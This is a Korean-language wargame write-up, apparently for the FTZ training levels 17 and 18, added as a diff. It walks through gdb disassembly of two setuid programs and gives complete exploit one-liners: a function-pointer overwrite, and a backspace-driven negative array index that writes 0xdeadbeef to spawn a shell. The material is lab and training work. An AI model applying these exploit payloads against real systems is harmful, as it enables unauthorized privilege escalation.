@@ -1,0 +1,172 @@
+1. level 17 
+
+항상그러듯 gdb -q 로 항상 먼저 파일을 분석해본다.
+
+gdb -q attackme
+(gdb) set disassembly-flavor intel
+(gdb) disas main
+Dump of assembler code for function main:
+0x080484a8 <main+0>:    push   ebp
+0x080484a9 <main+1>:    mov    ebp,esp
+0x080484ab <main+3>:    sub    esp,0x38
+0x080484ae <main+6>:    mov    DWORD PTR [ebp-16],0x8048490
+0x080484b5 <main+13>:   sub    esp,0x4
+0x080484b8 <main+16>:   push   ds:0x804967c
+0x080484be <main+22>:   push   0x30
+0x080484c0 <main+24>:   lea    eax,[ebp-56]
+0x080484c3 <main+27>:   push   eax
+0x080484c4 <main+28>:   call   0x8048350 <fgets>
+0x080484c9 <main+33>:   add    esp,0x10
+0x080484cc <main+36>:   sub    esp,0x8
+0x080484cf <main+39>:   push   0xc1a
+0x080484d4 <main+44>:   push   0xc1a
+0x080484d9 <main+49>:   call   0x8048380 <setreuid>
+0x080484de <main+54>:   add    esp,0x10
+0x080484e1 <main+57>:   mov    eax,DWORD PTR [ebp-16]
+0x080484e4 <main+60>:   call   eax
+0x080484e6 <main+62>:   leave
+0x080484e7 <main+63>:   ret
+0x080484e8 <main+64>:   nop
+0x080484e9 <main+65>:   nop
+
+
+보면  56 - 16 = 40바이트가 한계이다
+
+그러므로 40바이트 를 입력한 후에 다른 버퍼를 입력하면 버퍼오버플로우가 발생한다.
+
+
+그리고 cat hint 를 입력해서 힌트를 보면
+
+#include <stdio.h>
+
+void printit() {
+  printf("Hello there!\n");
+}
+
+main()
+{ int crap;
+  void (*call)()=printit;
+  char buf[20];
+  fgets(buf,48,stdin);
+  setreuid(3098,3098);
+  call();
+}
+
+인데 버퍼를 입력하고 버퍼오버플로우를 발생시켜서 setreuid 를 실행시킨다.
+
+고로 (python -c 'print "\x90"*40+"\x05\xff\xff\xbf"';cat)|./attackme
+
+버퍼 40 을 입력하고 뒤에 환경변수를 입력해서 ret주소를 얻는다.	( 즉 이 프로그램을 실행하는 중에는 level 18권한을 가지고있는것이다.)
+그리고 40 과 ret주소를 입력해서 버퍼오버플로우 공격을 시도하고
+
+my-pass 를 입력하면 level18 의 쉘을 얻을수있다.
+
+
+
+
+
+
+
+
+2. level18
+
+힌트 !!
+
+#include <stdio.h>
+#include <sys/time.h>
+#include <sys/types.h>
+#include <unistd.h>
+void shellout(void);
+int main()
+{
+  char string[100];
+  int check;
+  int x = 0;
+  int count = 0;
+  fd_set fds;
+  printf("Enter your command: ");
+  fflush(stdout);
+  while(1)
+    {
+      if(count >= 100)
+        printf("what are you trying to do?\n");
+      if(check == 0xdeadbeef)
+        shellout();
+      else
+        {
+          FD_ZERO(&fds);
+          FD_SET(STDIN_FILENO,&fds);
+
+          if(select(FD_SETSIZE, &fds, NULL, NULL, NULL) >= 1)
+            {
+              if(FD_ISSET(fileno(stdin),&fds))
+                {
+                  read(fileno(stdin),&x,1);
+                  switch(x)
+                    {
+                      case '\r':
+                      case '\n':
+                        printf("\a");
+                        break;
+                      case 0x08:
+                        count--;
+                        printf("\b \b");
+                        break;
+                      default:
+                        string[count] = x;
+                        count++;
+                        break;
+                    }
+                }
+            }
+        }
+    }
+}
+
+void shellout(void)
+{
+  setreuid(3099,3099);
+  execl("/bin/sh","sh",NULL);
+}
+
+
+
+
+
+배열의 인덱스가 -가 되면 버퍼 앞의 메모리에 접근할 수 있습니다.
+이것을 통해 string[100]보다 나중에 설정된 check에 접근할 수 있는 방법이다.
+
+
+공략할 방법을 구상해 볼까요.
+1) string[100]~ check거리
+2) check에 0xdeadbeef입력하는 페이로드 제작
+3) 페이로드를 입력한다.
+
+
+
+(항상 분석할떄 복사해서 이용)
+
+string[100] 시작부분 
+
+0x08048743 <main+499>:  lea    eax,[ebp-100]
+
+check 의 시작부분은
+
+0x080485ab <main+91>:   cmp    DWORD PTR [ebp-104],0xdeadbeef
+
+이다. 
+
+이제 구할것은 버퍼 시작 주소 즉 string 와 check 의 거리이다.
+
+고로 100 - 104 = -4 이므로  시작주소는 -4이다.
+
+이제 페이로드를 구성해보면 "\x90"*4+"\xef\xbe\xad\xde" 되는데 현재 소스코드에서 -로만들만한 
+방법이 \x08로 적혀있으므로
+
+다시 페이로드를 적는다면.
+
+"\x08"*4+"\xef\xbe\xad\xde" 가된다. 따라서 완성된 페이로드는
+
+(python -c 'print "\x08"*4+"\xef\xbe\xad\xde"';cat)|/attackme 
+
+가 된다. 그리고 my-pass 를 입력하면 level19 쉘 패스워드가 나온다.
